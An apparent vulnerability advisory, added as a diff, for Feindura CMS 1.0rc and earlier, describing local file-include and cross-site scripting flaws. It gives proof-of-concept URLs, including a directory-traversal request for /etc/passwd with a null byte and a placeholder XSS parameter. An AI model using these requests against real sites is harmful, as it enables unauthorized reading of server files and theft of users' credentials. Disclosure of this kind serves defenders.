@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/44501/info
+
+Feindura CMS is prone to multiple local file-include vulnerabilities and a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit the local file-include vulnerabilities using directory-traversal strings to view and execute local files within the context of the webserver process. Information harvested may aid in further attacks.
+
+The attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Feindura CMS versions 1.0rc and prior are vulnerable. 
+
+Local file Include:
+
+http://www.example.com/[path]/library/process/download.php?filename=[path/to/file]
+
+http://www.example.com/[path]/library/thirdparty/filemanager/connectors/php/filemanager.php?mode=download&path=[path/to/file]
+
+http://www.example.com/[path]/?language=../../../../../../../etc/passwd%00
+
+Cross Site Scripting:
+
+http://www.example.com/[path]/library/sites/editor.php?category=[XSS] 
